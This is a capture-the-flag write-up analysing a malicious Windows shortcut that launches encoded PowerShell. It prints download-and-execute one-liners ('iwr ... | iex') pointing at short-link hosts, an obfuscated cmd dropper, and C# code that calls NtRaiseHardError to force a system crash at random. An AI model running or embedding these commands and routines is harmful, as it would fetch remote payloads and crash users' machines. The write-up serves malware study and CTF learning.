+++
title = "Russian Roulette"
description = "My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :("
authors = ["cstef"]
date = 2024-09-30

[taxonomies]
categories = ["malware"]
+++

## Description

My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(

----

We are given a `.lnk` file, that we can parse with [`lnkparse`](https://pypi.org/project/LnkParse3/):

```
Windows Shortcut Information:
   ...

   TARGET:
      ...

   LINK INFO:
      ...

   DATA:
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:\Windows\system32
      Command line arguments: -e aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=

   EXTRA:
      ...
```

Quite a lot of junk here but we see that `powershell.exe` is being passed some base64-encoded stuff.

```bash
echo "aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=" | base64 -d

# is.gd/zd4hZn
```

```bash
curl -L is.gd/zd4hZn > first.out
```


Our `first.out` file looks a bit weird, but we can deduct that is a `cmd` script split into three main parts:

1. Aliases for the `set` command:
```cmd
&cls
@echo off
set x=set
%x% s=
%x%%s%zz==
%x%%s%p%zz%/
%x%%s%ma%zz%a
%x%%s%gm%zz%c
%x%%s%qf%zz%m
%x%%s%h%zz%d
%x%%s%ax%zz%e
%x%%s%ds%zz%x
%x%%s%rb%zz%i
%x%%s%cu%zz%t
%x%%s%qd%zz%
```

2. Character mappings

```cmd
%x%%s%%p%%ma%%s%z%zz%8639305 %% 8639208
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%z%
%x%%s%wp%zz%%=exitcodeAscii%
%x%%s%%p%%ma%%s%ab%zz%3403246 %% 3403148
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%ab%
%x%%s%v%zz%%=exitcodeAscii%
%x%%s%%p%%ma%%s%cy%zz%5276898 %% 5276799
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%cy%
%x%%s%e%zz%%=exitcodeAscii%
```

3. Payload

```cmd
%qu%%qu%%qd%%eb%%ax%%cu%%qd%%ds%%dc%%u%%ma%%g%%u%%gm%%v%%dc%%gm%%qg%%gm%%ba%%ec%%hv%%cu%%u%%ax%%xk%%ul%%ds%%o%%ax%%nv%%ax%%ds%%g%%wa%%h%%qf%%ds%%gm%%ec%%ul%%eb%%rb%%ds%%qf%%wa%%wa%%t%%rb%%qg%%u%%pv%%rb%%cr%%nv%%cr%%o ...
```

After arranging the whole thing with `---START---` and `---END---` delimiters, we can start decoding !

```js
const fs = require("fs");

const MAPPING_REGEX = /%x%%s%%p%%ma%%s%(.*)%zz%(\d+) %% (\d+)\n.*\n%x%%s%(.*)%zz%%=exitcodeAscii%/g;

const file = process.argv[2];

const data = fs.readFileSync(file, "utf16le");
const matches = data.matchAll(MAPPING_REGEX);

// Manual mappings defined at part 1. (needed for "/a cmd exit")
const mappings = {
	ma: "a",
	gm: "c",
	qf: "m",
	h: "d",
	ax: "e",
	ds: "x",
	rb: "i",
	cu: "t",
	qd: " ",
};

// Parse mappings from part 2.
for (const match of matches) {
	const [_, _, dividend, divisor, variable] = match;
	const result = parseInt(dividend) % parseInt(divisor);
	const char = String.fromCharCode(result);
	console.log(`${variable} => ${char}`);
	mappings[variable] = char;
}

// Retrieve the payload part
const to_decode = data.split("---START---")[1].split("---END---")[0].split("\n");

let res = "";

for (let line of to_decode) {
	let match = line.matchAll(/%([a-z]{1,2})%/g);
    // Replace with the matching mapped char
	for (const m of match) {
		const [_, prefix] = m;
		const mapped = mappings[prefix];
		if (mapped !== undefined) {
			line = line.replace(`%${prefix}%`, mapped);
		}
	}
	res += line + "\n";
}

console.log(res);
```

Running this and we get another file full of junk:

```cmd
rem set yjchhfxckpteverppmhztkiqhhpehqjgvzpglozcjzxxczmkhrww=yvrclcqlfnfpxmcwpqpjsdybfvggxacsfacvjpcliuwpzbzroenqawfxrc
rem set fzhnusjekleyyjbpzlmygwjvtqwvtgqwdjssqpncuqytnfijbqribyhkmmdhxq=jsqpyyljkjmwxxnkqvvnemyxwtgpobiljbkxuozgtrqdnydgtltwo
:: set urfroegmtkpfqis=verfnkrbhcmiajaezhqb
set jpyqlchzcuzgmjsahxjxenltfpdygmdkztrzqouxkdfwkewypaiwxvhyyoncafjbqfsh=dbvxggytlrfvtl
set rmdybvgurqrxfqmhbseysiyiqauksottklgaitbij=xvoapkvhtwrwvrylzgbsxjmtgxymdgjs
rem set syuzveatifikhhcdvsavncalizphjsukxggujlvfqn=eclazgecomzdgvl
set ftzoy=syywqkwsdqxvzkidymdrijcp
powershell -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==
:: set urfroegmtkpfqis=verfnkrbhcmiajaezhqb
:: set xwrahrcbwcgcuoktrepnxfevexhydmxconsixmyyqigr=izvzf
set rmdybvgurqrxfqmhbseysiyiqauksottklgaitbij=xvoapkvhtwrwvrylzgbsxjmtgxymdgjs
set qhpjorldrymwegzawcstabkrryxcnflhkropseifrzxwwxdpz=plobsfozpdbdkzadbscqzmunzqawmuikgfrvvy
set cbatydmrbkgqjtmgcdpyytxqbjxj=esguhttobrtqjcfesywmllbvytnpcqym
rem set yjchhfxckpteverppmhztkiqhhpehqjgvzpglozcjzxxczmkhrww=yvrclcqlfnfpxmcwpqpjsdybfvggxacsfacvjpcliuwpzbzroenqawfxrc
set ftzoy=syywqkwsdqxvzkidymdrijcp
```

All the lines starting with `rem` or `::` are comments so we can safely ignore them, the one that seems interesting is:

```cmd
powershell -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==
```

Another round of base64 decoding:
```bash
echo "aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==" | base64 -d
# iwr is.gd/QRDyiP|iex
```

You know what's next, `curl`-it. We now get a CSharp program that is being compiled and ran. A little formatting so that our eyes stop bleeding from this oneliner:

```cs
using System;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO;

public class X
{
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int p, bool e, bool c, out bool o);
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint e, uint n, uint u, IntPtr p, uint v, out uint r);
    public static unsafe string Shot()
    {
        bool o; uint r; RtlAdjustPrivilege(19, true, false, out o);
        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out r);
        byte[] c = Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");
        byte[] k = Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");
        byte[] i = Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");
        using (Aes a = Aes.Create())
        {
            a.Key = k;
            a.IV = i;
            ICryptoTransform d = a.CreateDecryptor(a.Key, a.IV);
            using (var m = new MemoryStream(c))
            using (var y = new CryptoStream(m, d, CryptoStreamMode.Read))
            using (var s = new StreamReader(y))
            {
                return decryptedText;
            }
        }
    }
}
```

We have a simple AES encryption going inside the `Shot()` function, which is then conditionally called in the script from the previous URL:

```powershell
if ((Get-Random -Min 1 -Max 7) -eq 1) { [X]::Shot() }
```

Our `Shot()` function basically adjusts the program's privileges to allow it to shutdown the system and then raises an error `0xc0000022` telling the system it needs to shut down with the `6` (shutdown action) argument.

It was getting pretty late at the time of solving this and I did not have the courage to compile csharp at midnight on a mac without visual studio and a 10Mpbs Internet connection, so I decided to rewrite the encryption process from the file in nodejs.

```js
const crypto = require("crypto");

const encryptedText = Buffer.from("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw", "base64");
const aesKey = Buffer.from("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=", "base64");
const aesIv = Buffer.from("9sXGmK4q9LdYFdOp4TSsQw==", "base64");

const decipher = crypto.createDecipheriv("aes-256-cbc", aesKey, aesIv);

let decrypted = decipher.update(encryptedText, "base64", "utf-8");
decrypted += decipher.final("utf-8");

console.log(decrypted);
```

Running this and we finally get the flag: 
```
flag{4e4f266d44717ff3af8bd92d292b79ec}
```